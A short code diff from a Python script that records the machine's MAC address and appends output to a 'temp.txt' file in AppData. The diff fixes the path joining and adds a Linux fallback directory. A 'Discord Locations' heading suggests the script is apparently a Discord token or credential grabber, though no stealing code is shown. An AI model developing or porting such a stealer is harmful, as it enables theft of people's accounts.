@@ -63,7 +63,13 @@ mac = get_mac()
 
 roaming = os.getenv('AppData')
 ## Output for txt file location
-output = open(roaming + "temp.txt", "a")
+roaming = os.getenv("APPDATA")
+
+if roaming is None:
+    roaming = os.path.expanduser("~/.config/")   # Linux fallback
+
+output = open(os.path.join(roaming, "temp.txt"), "a")
+
 
 
 ## Discord Locations
